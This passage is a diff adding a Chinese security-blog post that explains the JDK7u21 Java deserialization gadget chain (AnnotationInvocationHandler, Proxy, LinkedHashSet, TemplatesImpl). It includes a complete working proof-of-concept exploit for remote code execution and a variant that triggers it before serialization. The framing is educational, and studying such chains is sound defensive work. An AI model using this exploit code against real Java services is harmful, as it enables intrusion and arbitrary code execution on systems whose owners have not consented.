+<li>它的type属性是一个TemplateImpl类 </li>
+<li>它的memberValues属性是一个Map，Map只有一个key和value，key是字符串 f5a5a608 ， value是前面生成的恶意TemplateImpl对象</li>
+</ul>
+</blockquote>
+<p>实例化<code>AnnotationInvocationHandler</code>类，将map传参进去，经过构造函数设置为<code>memberValues</code></p>
+<p>由于<code>equalImpl()</code>方法会调用<code>memberMethod.invoke(o)</code>，这个<code>memberMethod</code>来自<code>this.type.getDeclaredMethods()</code>所以需要设置<code>type</code>为<code>TemplatesImpl</code>的 字节码，这里构造函数会将第一个参数设为<code>type</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Constructor</span> <span class="hljs-variable">handlerConstructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>handlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">tempHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);<br></code></pre></td></tr></table></figure>
+
+<p>在创建核心的<code>LinkedHashSet</code>之前，我们需要创建一个代理对象，将<code>tempHandler</code>给传进去</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 为tempHandler创造一层代理</span><br><span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);<br></code></pre></td></tr></table></figure>
+
+<p>然后实例化：HashSet：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 实例化HashSet，并将两个对象放进去</span><br><span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>();<br>set.add(templates); <br>set.add(proxy);<br></code></pre></td></tr></table></figure>
+
+<p>添加的先后顺序要注意一下，Proxy应该放在后面，这样才会调用<code>Proxy#equals()</code></p>
+<p>这样在反序列化触发rce的流程如下：</p>
+<p>首先触发HashSet的<code>readObject()</code>方法，然后集合中的值会使用<code>LinkedHasnMap</code>的<code>put(key,常数)</code>方法进行key去重</p>
+<p>去重时计算元素的<code>hashcode</code>，由于我们已经构造其相等，所以会触发<code>Proxy#equals()</code>方法</p>
+<p>进而调用<code>AnnotationInvocationHandler#invoke()</code>-&gt; <code>AnnotationInvocationHandler#equalsImpl()</code>方法</p>
+<p><code>equalsImpl()</code>会遍历<code>type</code>的每个方法并调用。</p>
+<p>因为<code>this.type</code>是<code>TemplatesImpl</code>字节码对象，所以最终会触发<code>newTransformer()</code>造成RCE</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.LinkedHashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDK7u21</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">zeroHashCodeStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;f5a5a608&quot;</span>;<br><br>        <span class="hljs-comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(zeroHashCodeStr, <span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-comment">// 实例化AnnotationInvocationHandler类</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">handlerConstructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        handlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">tempHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);<br><br>        <span class="hljs-comment">// 为tempHandler创造一层代理</span><br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);<br><br>        <span class="hljs-comment">// 实例化HashSet，并将两个对象放进去</span><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>();<br>        set.add(templates);<br>        set.add(proxy);<br><br>        <span class="hljs-comment">// 将恶意templates设置到map中</span><br>        map.put(zeroHashCodeStr, templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(set);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">HashSet#readObject()<br>    LinkedHashMap#put(e, PRESENT)<br>    	Proxy#equals(k)<br>    		AnnotationInvocationHandler#invoke()<br>    			equalsImpl()<br>    				TemplatesImpl#newTransformer()<br>    					...<br>    					ClassLoader.defineClass()<br>    					...<br>    					Runtime.exec()<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="为什么在HashSet-add-前要将HashMap的value设为其他值？"><a href="#为什么在HashSet-add-前要将HashMap的value设为其他值？" class="headerlink" title="为什么在HashSet#add()前要将HashMap的value设为其他值？"></a>为什么在HashSet#add()前要将HashMap的value设为其他值？</h3><p>我们追踪一下<code>HashSet#add()</code>方法，发现他也会调用<code>HashMap#put()</code>方法，这样就会导致Proxy提前触发<code>equals()</code>方法造成命令执行：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308031814081.png" srcset="/img/loading.gif" lazyload alt="image-20230803181355838"></p>
+<p>我们测试一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.LinkedHashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDK7u21</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">zeroHashCodeStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;f5a5a608&quot;</span>;<br><br>        <br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(zeroHashCodeStr, templates);  <span class="hljs-comment">//value再这里设为templates</span><br><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">handlerConstructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        handlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">tempHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);<br><br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);<br><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>();<br>        set.add(templates);<br>        set.add(proxy);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功不经过反序列化就弹出计算器：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308031816016.png" srcset="/img/loading.gif" lazyload alt="image-20230803181634928"></p>
+<p>所以我们需要先将<code>HashMap</code>的唯一一个元素的value设为其他值</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://leekosss.github.io/2023/08/24/[java安全]原生反序列化利用链JDK7u21/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年8月3日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/%5Bms12-020%5D%E8%93%9D%E5%B1%8F%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="【ms12-020】蓝屏漏洞复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【ms12-020】蓝屏漏洞复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/%5Bjava%E5%AE%89%E5%85%A8%5D%E6%97%A0Commons-Collections%E7%9A%84Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
